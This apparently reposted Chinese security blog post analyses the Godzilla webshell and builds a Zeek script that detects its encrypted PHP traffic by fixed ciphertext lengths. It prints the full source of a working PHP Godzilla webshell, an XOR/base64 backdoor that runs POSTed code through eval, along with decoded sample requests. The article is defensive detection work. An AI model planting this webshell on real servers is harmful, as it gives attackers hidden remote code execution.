> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/qnrizGo_B12RzmEF6nePDA)

![](https://mmbiz.qpic.cn/mmbiz_jpg/Ok4fxxCpBb6iclZLNdFVsRROLj5obG15njXne5PxgGeU4WBno9l0yAlqmduxMz7iauOlf1icho8XIZJ3Vt0kJAeUw/640?wx_fmt=jpeg)

  

  

  

前言

  

  

  

“过市面所有静态查杀”、“流量加密过市面全部流量 waf”，伴随着这样的标签，哥斯拉在今年的攻防演练活动中成功亮相。这是赐给红队的又一把尖刀，也让防守队雪上加霜。截至目前，主机层面的主流查杀工具均已覆盖了哥斯拉 webshell 静态规则，但流量层面的检测可能仍然要打一个问号。

  

  

  

webshell 分析

  

  

  

关于哥斯拉的功能，通过《攻防礼盒：哥斯拉 Godzilla Shell 管理工具》这篇文章可以有比较全面的了解。nercis 在《哥斯拉 Godzilla 运行原理探寻》一文中通过生成的 jsp 版 shell 和客户端 jar 包向大家介绍了其运行原理。

由于哥斯拉在处理 jsp 和 php 时加密方式存在差异，本文将从 php 版的 shell 展开，对其运行原理再做一下总结和阐述。

先生成一个 php 静态 shell，加密器选择 PHP_XOR_BASE64。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6iclZLNdFVsRROLj5obG15nSGJxDj1j80XHRqyMhb3b8L3WH3QrAMDYnS9HAxLBkxQrypxpEEwzpQ/640?wx_fmt=png)

生成的 shell 代码如下：

```
<?php
    session_start();
    @set_time_limit(0);
    @error_reporting(0);
    function E($D,$K){
        for($i=0;$i<strlen($D);$i++) {
            $D[$i] = $D[$i]^$K[$i+1&15];
        }
        return $D;
    }
    function Q($D){
        return base64_encode($D);
    }
    function O($D){
        return base64_decode($D);
    }
    $P='s4kur4';
    $V='payload';
    $T='85f35deb278e136e';
    if (isset($_POST[$P])){
        $F=O(E(O($_POST[$P]),$T));
        if (isset($_SESSION[$V])){
            $L=$_SESSION[$V];
            $A=explode('|',$L);
            class C{public function nvoke($p) {eval($p."");}}
            $R=new C();
            $R->nvoke($A[0]);
            echo substr(md5($P.$T),0,16);
            echo Q(E(@run($F),$T));
            echo substr(md5($P.$T),16);
        }else{
            $_SESSION[$V]=$F;
        }
    }
```

其中比较核心的地方有两处，第一处是进行异或加密和解密的函数 E($D,$K)，第二处是嵌套的两个 if 对哥斯拉客户端上传的代码做执行并得到结果。根据 $F=O(E(O($_POST[$P]),$T)); 这行做逆向判断，可以得到哥斯拉客户端上传代码时的编码加密过程：

原始代码 -> Base64 编码 -> E 函数进行异或加密 -> 再 Base64 编码

为了使客户端分离出结果，三个 echo 利用 md5 值作为分离标志，将得到的代码执行结果进行拼接：

md5($P.$T) 前 16 位  
结果 -> E 函数进行异或加密 -> Base64 编码  
md5($P.$T) 后 16 位

另外，根据 $_SESSION[$V]=$F; 这行判断，客户端首次连接 shell 时会在 $_SESSION 中保存一段代码，叫 payload。结合后面突然出现的函数 run，猜测这个 payload 在后续 shell 连接过程中可能会被调用。整个 shell 的运行原理到这里基本就能明确了，可以用下面的流程图来总结：

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6iclZLNdFVsRROLj5obG15ntiaRdbYHq3cT4U7upWQ1Lo7es8xHwtI8XrR3mBeQAJPFPElLcq6LnQg/640?wx_fmt=png)

  

  

  

特征提取

  

  

  

通常，流量层面对恶意行为进行检测，倾向于筛选出一些强特征、固定特征。例如检测使用 ceye.io 进行的 OOB 通信，只需要去匹配流量中包含.+\.ceye\.io 的 DNS 请求，通过四元组即可判断受害主机和攻击者 IP，这里 ceye.io 关键字就是固定特征。固定特征具有一致性、不易改变的特点，就好似与生俱来的特点。

### **挖掘哥斯拉强特征**

如何寻找哥斯拉的流量特征呢？最先想到的是先前冰蝎的捕获经验，即在 shell 的建连初期出现的强特征。至于 HTTP 头部的 UA 等特征，由于其易被改变，因此暂不考虑。开启 Wireshark 设置过滤条件，重新打开哥斯拉客户端并添加生成的 shell（点击 “阅读原文” 查看演示动图）

此时未出现任何流量。继续右键进入，哥斯拉会返回目标的相关信息，Wireshark 瞬间出现 3 个 http 包：

![](https://mmbiz.qpic.cn/mmbiz_gif/Ok4fxxCpBb6iclZLNdFVsRROLj5obG15nBHIBAQqwSBaQssibicBJvdx1MFmVicJ4WXNa0BkGJM06ucmVCWE4Dprbg/640?wx_fmt=gif)

跟踪 http 流，发现 3 个 http 包处在同一 TCP 中，说明哥斯拉使用了 TCP 长连接，这对流量特征分析比较有利。对这 3 个 http 包逐个分析一下。

从 shell 的代码已知，客户端首次连接 shell 会上传一段代码 payload，以备后续操作调用。查看其请求，发现内容长度居然超过 23000 字节。同时，http 响应内容为空：

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6iclZLNdFVsRROLj5obG15nhPlAT95ea0YjqqwGcG1QyO0a7KMKbzMr0OnCabqp6ick698icibSSNzSQ/640?wx_fmt=png)

使用 $F=O(E(O($_POST[$P]),$T)) 对这一长串内容进行解密，得到 payload 的原始内容。好家伙，包含 run、bypass_open_basedir、formatParameter、evalFunc 等二十多个功能函数，具备代码执行、文件操作、数据库操作等诸多功能。

第二个 http 的请求内容为：

s4kur4=VzFlBQUiW1ljVSNFaWJUU2dXaQM%2BICcLZ2lYDA%3D%3D

解密得到原始代码 methodName=dGVzdA==，即 methodName=test。跟踪执行过程，发现最终目的是测试 shell 的连通情况，并向客户端打印输出 ok。这个过程是典型的固定特征，与第一个 http 请求一样，上传的原始代码是固定的。

第三个 http 的作用是获取目标的环境信息，请求内容为：

s4kur4=VzFlBQUiW1ljVSNFaWJUWXgKakIxMlN1UlUjaWdYFWxjHGVBPQsBC2dpWAw%3D

解密得到原始代码 methodName=Z2V0QmFzaWNzSW5mbw==，即 methodName=getBasicsInfo。此操作调用 payload 中的 getBasicsInfo 方法获取目标环境信息向客户端返回。显然，这个过程又是一个固定特征。

至此，成功挖掘到哥斯拉客户端与 shell 建连初期的三个固定行为特征，且顺序出现在同一个 TCP 连接中。可以总结为：

特征：发送一段固定代码（payload），http 响应为空  
特征：发送一段固定代码（test），执行结果为固定内容  
特征：发送一段固定代码（getBacisInfo）

### **强特征规则化**

明确了三个紧密关联的特征后，需要对特征规则化。由于对内容的加密，即使哥斯拉每次都发送一段固定代码，检测引擎也无法通过规则直接匹配。另外，webshell 的密码、密钥均不固定，代码加密后的密文也不同。

回看 webshell 代码，$P 和 $T 在生成时属于非固定值，但在 shell 连接的整个生命周期，却又是固定值。$T 是密钥的 md5 值前 16 位，属于唯一的加密因子，被用于与原始代码进行异或。哥斯拉进行异或加密时，循环使用加密因子 $T 的每一位与被加密字符串进行异或位运算。这就引出了第一个真理：

*   长度为 l 的字符串与长度为 n 的加密因子循环按位异或，密文的长度为 l
    

可以取出 shell 中的 E 函数，计算随机字符串的 md5 对固定字符串做异或，进行穷举验证：

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6iclZLNdFVsRROLj5obG15nFQIFibCNib7rGNMgKumSib4cTiciaiaXQL4UeaanYlyE9GJlqCNjzxHrOffQ/640?wx_fmt=png)

对于哥斯拉中频繁使用的 Base64 编码，又会引出真理二：

*   长度为 l 的字符串进行 Base64 编码后长度为定值
    

熟悉 Base64 编码过程的同学应该知道，Base64 本质上是由二进制向字符串转换的过程。对长度固定的随机字符串进行 Base64 编码，穷举验证：

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6iclZLNdFVsRROLj5obG15ngSWuaNLRVmX0g8OWwMficVTYFaO5LQXcCV66nR2sDWpMFK9DsWfXjsQ/640?wx_fmt=png)

现在基本可以下结论了，即哥斯拉上传的三个固定代码，密文的长度是固定的。计算了一下，分别是 23068、40、60。如此一来就能总结出以下三条规则：

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6iclZLNdFVsRROLj5obG15n9tZYBxdKKsm34ps87hvUN8qWAwxRG2kT5aAAeRMtmfXicuRbvACLh4g/640?wx_fmt=png)

  

  

  

Zeek 巧妙落地

  

  

  

对规则的落地要依托流量层检测的基础设施，上面总结出的三条规则具有上下文关联性，传统的 IDS 无法直接实现。这里的难点在于，需要一次性对三个数据包做实时判断，并且需要对包内容做一些字符串的切割、解码操作。能想到的要么是大数据实时计算，要么是 Zeek 了。

想必熟悉 Zeek 的同学一定了解其统计框架 Summary Statistics，你可以对符合特定条件的数据进行统计、计算。例如统计同一个源 IP 发起的 SSH 登录行为并计算次数，在某个时间段内超过阈值 $threshold 就产生一条 SSH 暴力破解的告警。在哥斯拉的场景里，可以巧妙的用 Zeek 统计框架收集同一 TCP 连接中的 http 数据。Zeek 脚本语言也完全满足统计数据以后的匹配计算。

先创建一个统计实例，设置延时 $epoch 为 10 秒，统计阈值 $threshold 为 3，即统计 10 秒钟内产生的连续 3 个 http 包。当事件 http_message_done 发生时执行统计并收集数据：

```
event http_message_done(c: connection, is_orig: bool, stat: http_message_stat)
{
  if ( c?$http && c$http?$status_code && c$http?$method )
  {
    if ( c$http$status_code == 200 && c$http$method == "POST" )
      {
        local key_str: string = c$http$uid + "$_$" + cat(c$id$orig_h) + "$_$" + cat(c$id$orig_p) + "$_$" + cat(c$http$status_code) + "$_$" + cat(c$id$resp_h)+ "$_$" + cat(c$id$resp_p) + "$_$" + c$http$uri;
        local observe_str: string = cat(c$http$ts) + "$_$" + c$http$client_body + "$_$" + c$http$server_body;
        SumStats::observe("godzilla_webshell_event", SumStats::Key($str=key_str), SumStats::Observation($str=observe_str));
      }
  }
}
其中，统计条件为同一TCP连接中HTTP响应为200的数据包，并且具备相同的URI。收集的数据内容主要为包的捕获时间、http请求内容、http响应内容。收集到符合这些条件的数据后数据被带进$threshold_crossed，此处开始对三个http包进行解析匹配：if ( |result["godzilla_webshell_event"]$unique_vals| == 3 )
{
 for ( value in result["godzilla_webshell_event"]$unique_vals )
 {
  local observe_str_vector: vector of string = split_string(value$str, /\$_\$/);

  # 对请求内容进行URL解码
  observe_str_vector[1] = unescape_URI(observe_str_vector[1]);

  local request_body_only_value: string;
  # 从请求中分离出加密代码部分
  request_body_only_value = observe_str_vector[1][strstr(observe_str_vector[1], "=") : |observe_str_vector[1]|];

  # 规则1:
  # 发送的加密代码长度为23068 && HTTP响应内容为空
  if ( |request_body_only_value| == 23068 && |observe_str_vector[2]| == 0 )
  {
    sig1 = T;
  }

  local response_body: string = observe_str_vector[2];
  # 规则2: 
  # 加密代码长度为40 && HTTP响应内容长度为40 && 响应内容首尾各16位md5字符串
  if ( |request_body_only_value| == 40 && |response_body| == 40 && response_body == find_last(response_body, /[a-z0-9]{16}.+[a-z0-9]{16}/) )
  {
    sig2 = T;
  }

  # 规则3: 
  # 发送的加密代码长度为60 && 响应内容首尾各16位md5字符串
  if ( |request_body_only_value| == 60 && response_body == find_last(response_body, /[a-z0-9]{16}.+[a-z0-9]{16}/) )
  {
    sig3 = T;
  }
 }

 # 三个规则同时符合，进行告警
 if ( sig1 && sig2 && sig3 )
 {
  print fmt("[+] Godzilla traffic detected, %s:%s -> %s:%s, webshell URI: %s", key_str_vector[1], key_str_vector[2], key_str_vector[4], key_str_vector[5], key_str_vector[6]);
 }
}
```

代码实现后，在服务器端启动 PHP 环境放置哥斯拉 shell，启动 Zeek 监听网卡。本地客户端添加 shell 后点击进入，顺利打印出告警，令人欣慰（点击 “阅读原文” 查看演示动图）

  

  

  

总结

  

  

  

本文从哥斯拉 php 版的异或加密 shell 出发，探索了一种流量层检测哥斯拉的思路和方法。由于哥斯拉 php 版 shell 还有另一种加密器，还支持 jsp 版、.net 版等多种情况，鉴于篇幅和工作量，本文未做一一分析和覆盖。正如文章前言所述，其实这样的检测分析文章不舍得发，一旦发了可能才是检测困难真正的开始。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6OLwHohYU7UjX5anusw3ZzxxUKM0Ert9iaakSvib40glppuwsWytjDfiaFx1T25gsIWL5c8c7kicamxw/640?wx_fmt=png)

  

- End -  

精彩推荐

[入侵检测系列 1（中）基于私有协议的加密流量分析思路（Teamviewer 篇）](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649736371&idx=1&sn=e397ff5934fd08294daa26ad07ba7260&chksm=888cf4dcbffb7dca9cc25b9c49ed48bea2a3a725b66507505c808a0f73e415cf59149d694484&scene=21#wechat_redirect)
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[笑着走向终结：Flash 喜迎最后一次更新](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649736292&idx=1&sn=1bbd47d850249298d575c279cd6cc5e1&chksm=888cf40bbffb7d1de50882015ce77fc31f2ef40c31ff0611d70dd15677701351a8952da6ecc7&scene=21#wechat_redirect)
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[托管服务提供商 Netgain 的数据中心因勒索软件而被迫下线](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649736204&idx=1&sn=97c85230a44dea13f104a7652cfee01d&chksm=888cf463bffb7d759f4a9521a3f424b17f22369594260696db03c29d8e1d21ef967b1f18635b&scene=21#wechat_redirect)
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[NortonLifeLock3.6 亿美元收购 Avira](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649736203&idx=1&sn=0e9a48903d488247f4a69cb3c92b4c21&chksm=888cf464bffb7d72aed418caf463b8dc8df01e5e109e56ab5b71959b57f7bc6c35a8feab6839&scene=21#wechat_redirect)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ok4fxxCpBb5ZMeq0JBK8AOH3CVMApDrPvnibHjxDDT1mY2ic8ABv6zWUDq0VxcQ128rL7lxiaQrE1oTmjqInO89xA/640?wx_fmt=gif)  

---------------------------------------------------------------------------------------------------------------------------------------------------

**戳 “阅读原文” 查看更多内容**